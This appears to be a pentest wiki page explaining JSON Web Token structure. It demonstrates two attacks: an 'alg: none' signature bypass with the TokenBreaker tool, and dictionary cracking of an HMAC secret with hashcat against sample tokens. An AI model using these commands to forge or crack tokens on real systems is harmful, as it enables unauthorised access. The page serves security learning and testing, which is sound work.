# JSON Web Tokens

JSON Web Tokens (or ubiquitously known as JWT) is url safe object serialization standard to transfer user information across multiple endpoints (parties). They are used more in the serverless workloads.

It is a single string formed by joining 3 parts with a period (or dot **`.`**) delimiter: Header, Payload and Signature. The following is basically a format of JWT (invalid string though)

```
xxxx.yyyy.zzzz
```

- **Header** contains the information of type of string (`typ` field) and algorithm to encode the signature (`alg`). The most common algorithm is HMAC SHA-256.
- **Payload** contains actual data which is to be shared between different services.
- **Signature** is used to verify token integrity and ensure it is not changed along the way.

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

For instance, lets say I have the following json format

```json
{
  "userId": 1,
  "email": "user@example.com",
  "role": "admin"
}
```

The equivalent JWT of this **payload** would look like following:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.ISMGBR03A34jn_tHvA6UoySeXUenRR6kMaEyTOlEZRQ
```

> **Note:** It is recommended that the JWT needs to be stored in a safe place inside the user's browser (like HTTP-Only Safe Cookies). If you store it in a LocalStorage/SessionStorage then it can be easily grabbed by an XSS attack.

Whenever the user wants to access a protected route or resource, the user agent should send the JWT, typically in the Authorization header using the Bearer schema. The content of the header should look like the following:

```js
Authorization: Bearer <token>

// For example
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.ISMGBR03A34jn_tHvA6UoySeXUenRR6kMaEyTOlEZRQ
```

## JSON Debugger

If you have the base64 encoded JWT string, you can paste in the [debugger](https://jwt.io/#debugger-io) which will give you the deserilized header, payload and signature section.

![](https://i.imgur.com/PX4aecp.png)

Since the signature is the encrypted using the key (known the application developer), it is not possible for the debugger to retrieve that for you.

## Exploiting Header

There are several libraries to parse and decode the JWT string. From my experiences, developers hardly upgrade the version of libraries or migrate to more stable one and rather use vulnerable versions of them.

To forge a custom token, secret must be known which is then used by the function defined in the `alg` field. In some older versions you can force the library to ignore the signature verificiation by setting `alg` to NONE.

{% embed url="https://github.com/cyberblackhole/TokenBreaker#thenone-usage" %}

```bash
git clone https://github.com/cyberblackhole/TokenBreaker.git
cd TokenBreaker
python TheNone.py --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImVtYWlsIjoidXNlckBleGFtcGxlLmNvbSIsInJvbGUiOiJhZG1pbiJ9.ISMGBR03A34jn_tHvA6UoySeXUenRR6kMaEyTOlEZRQ

# enter n (not change header)
# enter updated payload
```

![](https://i.imgur.com/U0oxzsk.png)

Now if you would check the generated token in the debugger, it would look like the following

![](https://i.imgur.com/wcrXWPk.png)

## Exploiting Signature

The signature is what help endpoint validate integrity of the token contents that it is created by one of the legitimate service. However, it can be forged on the client-side and then sent to the services to access protected resources.

### Bruteforce Secret Key

The value depends on the header, payload, secret key and encryption algorithm. In these, we know everything accept the secret key. To find the correct secret key, we can launch a dictionary-based bruteforce attack.

```bash
cat << EOF > tokens.txt
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJ1c2VyQGV4YW1wbGUuY29tIiwicm9sZSI6ImFkbWluIn0.aia66rGm9rp6DG1XqeowErywsNMyPxomZ4fdji79yl8
EOF


hashcat -m 16500 -a 0 tokens.txt wordlist.txt
```

The secret key for the above example is: **V3ryS3cureK3y@123**

![](https://i.imgur.com/vCwN3Yb.png)

## Resources and References

{% embed url="https://jwt.io/introduction" %}

{% embed url="https://learn.microsoft.com/en-us/answers/questions/550043/jwt-storage.html" %}

{% embed url="https://tbhaxor.com/javascript-authentication-best-practices/" %}

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml" %}
